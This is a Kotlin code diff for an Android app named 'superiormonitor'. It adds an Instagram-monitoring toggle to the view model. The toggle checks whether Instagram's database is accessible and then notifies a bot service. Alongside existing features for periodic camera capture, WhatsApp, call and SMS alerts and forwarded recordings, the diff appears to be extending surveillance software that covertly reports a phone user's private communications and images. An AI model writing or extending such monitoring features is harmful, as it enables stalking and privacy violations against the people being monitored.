@@ -65,11 +65,14 @@ data class DashboardUiState(
     val enableRearCamera: Boolean = false,
     val rearCameraIntervalMin: Int = 15,
     val whatsappUpdatesEnabled: Boolean = false,
+    val instagramUpdatesEnabled: Boolean = false,
     val callAlertsEnabled: Boolean = false,
     val smsAlertsEnabled: Boolean = false,
     val forwardRecordingEnabled: Boolean = false,
     val showWhatsAppWarningDialog: Boolean = false,
-    val whatsAppWarningMessage: String = ""
+    val whatsAppWarningMessage: String = "",
+    val showInstagramWarningDialog: Boolean = false,
+    val instagramWarningMessage: String = ""
 )
 
 sealed class DashboardEvent {
@@ -86,10 +89,12 @@ sealed class DashboardEvent {
     data class ToggleRearCamera(val enabled: Boolean) : DashboardEvent()
     data class UpdateRearCameraInterval(val minutes: Int) : DashboardEvent()
     data class ToggleWhatsappUpdates(val enabled: Boolean) : DashboardEvent()
+    data class ToggleInstagramUpdates(val enabled: Boolean) : DashboardEvent()
     data class ToggleCallAlerts(val enabled: Boolean) : DashboardEvent()
     data class ToggleSmsAlerts(val enabled: Boolean) : DashboardEvent()
     data class ToggleForwardRecording(val enabled: Boolean) : DashboardEvent()
     object DismissWhatsAppWarningDialog : DashboardEvent()
+    object DismissInstagramWarningDialog : DashboardEvent()
 }
 
 /**
@@ -139,6 +144,7 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
                     enableRearCamera = prefs.enableRearCamera,
                     rearCameraIntervalMin = prefs.rearCameraInterval,
                     whatsappUpdatesEnabled = prefs.whatsappUpdatesEnabled,
+                    instagramUpdatesEnabled = prefs.instagramEnabled,
                     callAlertsEnabled = prefs.callAlertsEnabled,
                     smsAlertsEnabled = prefs.smsAlertsEnabled,
                     forwardRecordingEnabled = prefs.forwardRecordingEnabled
@@ -204,6 +210,7 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
             enableRearCamera = prefs.enableRearCamera,
             rearCameraIntervalMin = prefs.rearCameraInterval,
             whatsappUpdatesEnabled = prefs.whatsappUpdatesEnabled,
+            instagramUpdatesEnabled = prefs.instagramEnabled,
             callAlertsEnabled = prefs.callAlertsEnabled,
             smsAlertsEnabled = prefs.smsAlertsEnabled,
             forwardRecordingEnabled = prefs.forwardRecordingEnabled
@@ -428,6 +435,38 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
             is DashboardEvent.DismissWhatsAppWarningDialog -> {
                 _dashboardState.update { it.copy(showWhatsAppWarningDialog = false, whatsAppWarningMessage = "") }
             }
+            is DashboardEvent.ToggleInstagramUpdates -> {
+                if (event.enabled) {
+                    viewModelScope.launch(Dispatchers.IO) {
+                        val context = getApplication<Application>()
+                        if (!com.system.superiormonitor.monitor.InstagramMonitor.isInstagramInstalled(context)) {
+                            _dashboardState.update { it.copy(
+                                showInstagramWarningDialog = true,
+                                instagramWarningMessage = "Instagram is not installed on this device. Please install Instagram before enabling this feature."
+                            ) }
+                            return@launch
+                        }
+                        val (dbAvailable, dbReason) = com.system.superiormonitor.monitor.InstagramMonitor.checkInstagramDatabase()
+                        if (!dbAvailable) {
+                            _dashboardState.update { it.copy(
+                                showInstagramWarningDialog = true,
+                                instagramWarningMessage = dbReason
+                            ) }
+                            return@launch
+                        }
+                        prefs.instagramEnabled = true
+                        _dashboardState.update { it.copy(instagramUpdatesEnabled = true) }
+                        notifyBotService(context, "ACTION_UPDATE_INSTAGRAM")
+                    }
+                } else {
+                    prefs.instagramEnabled = false
+                    _dashboardState.update { it.copy(instagramUpdatesEnabled = false) }
+                    notifyBotService(getApplication(), "ACTION_UPDATE_INSTAGRAM")
+                }
+            }
+            is DashboardEvent.DismissInstagramWarningDialog -> {
+                _dashboardState.update { it.copy(showInstagramWarningDialog = false, instagramWarningMessage = "") }
+            }
             is DashboardEvent.ToggleCallAlerts -> {
                 prefs.callAlertsEnabled = event.enabled
                 _dashboardState.update { it.copy(callAlertsEnabled = event.enabled) }
@@ -453,6 +492,7 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
         prefs.enableFrontCamera = false
         prefs.enableRearCamera = false
         prefs.whatsappUpdatesEnabled = false
+        prefs.instagramEnabled = false
         prefs.callAlertsEnabled = false
         prefs.smsAlertsEnabled = false
         prefs.forwardRecordingEnabled = false
@@ -468,6 +508,7 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
                 enableFrontCamera = false,
                 enableRearCamera = false,
                 whatsappUpdatesEnabled = false,
+                instagramUpdatesEnabled = false,
                 callAlertsEnabled = false,
                 smsAlertsEnabled = false,
                 forwardRecordingEnabled = false
